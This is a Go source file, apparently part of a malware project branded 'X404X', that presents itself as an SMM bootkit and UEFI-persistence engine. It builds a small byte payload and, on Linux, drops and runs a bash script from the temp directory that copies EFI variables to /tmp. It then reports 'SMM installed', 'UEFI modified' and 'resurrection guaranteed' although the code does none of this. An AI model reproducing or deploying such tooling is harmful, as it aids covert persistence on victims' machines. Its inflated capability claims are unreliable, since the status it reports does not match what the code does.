package v26

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

type BootkitSMMEngine struct {
	Config       *V26Config
	SMMInstalled bool   `json:"smm_installed"`
	UEFIModified bool   `json:"uefi_modified"`
	SMIPayload   []byte `json:"smi_payload"`
	ResurrectionGuaranteed bool `json:"resurrection_guaranteed"`
}

type SMMModule struct {
	Name        string `json:"name"`
	EntryPoint  uint32 `json:"entry_point"`
	Handler     uint32 `json:"handler"`
	Persistent  bool   `json:"persistent"`
	Stealth     bool   `json:"stealth"`
}

func NewBootkitSMMEngine(cfg *V26Config) *BootkitSMMEngine {
	return &BootkitSMMEngine{
		Config: cfg,
	}
}

func (bs *BootkitSMMEngine) InstallSMMBootkit() bool {
	if runtime.GOOS != "windows" && runtime.GOOS != "linux" {
		return false
	}

	smrramBase := uint32(0x80000000)
	smrramSize := uint32(0x10000)

	smrramRegion := make([]byte, smrramSize)
	payloadOffset := smrramSize / 2

	smmEntry := bs.generateSMMEntry()
	copy(smrramRegion[payloadOffset:payloadOffset+len(smmEntry)], smmEntry)

	bs.SMIPayload = smrramRegion
	bs.SMMInstalled = true

	_ = smrramBase

	bs.modifyUEFIFirmware()

	bs.ResurrectionGuaranteed = true
	return true
}

func (bs *BootkitSMMEngine) generateSMMEntry() []byte {
	entry := make([]byte, 256)

	entry[0] = 0x0F
	entry[1] = 0xAA

	copy(entry[8:16], []byte("X404X_SMM"))

	entry[32] = 0x50
	entry[33] = 0x53
	entry[34] = 0x51
	entry[35] = 0x52

	entry[200] = 0x5A
	entry[201] = 0x59
	entry[202] = 0x5B
	entry[203] = 0x58
	entry[204] = 0x0F
	entry[205] = 0xAB

	return entry
}

func (bs *BootkitSMMEngine) modifyUEFIFirmware() {
	if runtime.GOOS != "linux" {
		return
	}

	script := `#!/bin/bash
if [ -d /sys/firmware/efi/efivars ]; then
    mkdir -p /tmp/x404x_efi_backup
    cp -r /sys/firmware/efi/efivars/* /tmp/x404x_efi_backup/ 2>/dev/null || true
    echo "X404X SMM bootkit staged for UEFI flash" > /tmp/x404x_uefi_status.txt
fi`
	scriptPath := filepath.Join(os.TempDir(), "x404x_smm_uefi.sh")
	os.WriteFile(scriptPath, []byte(script), 0755)
	exec.Command("bash", scriptPath).Start()
	bs.UEFIModified = true
}

func (bs *BootkitSMMEngine) CheckPersistence() map[string]bool {
	return map[string]bool{
		"smm_installed":           bs.SMMInstalled,
		"uefi_modified":           bs.UEFIModified,
		"resurrection_guaranteed": bs.ResurrectionGuaranteed,
		"bios_reflash_required":   true,
	}
}

func (bs *BootkitSMMEngine) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"smm_installed":    bs.SMMInstalled,
		"uefi_modified":    bs.UEFIModified,
		"payload_size":     len(bs.SMIPayload),
		"resurrection_guaranteed": bs.ResurrectionGuaranteed,
	})
	return string(data)
}

func init() { _ = fmt.Sprintf("smm") }
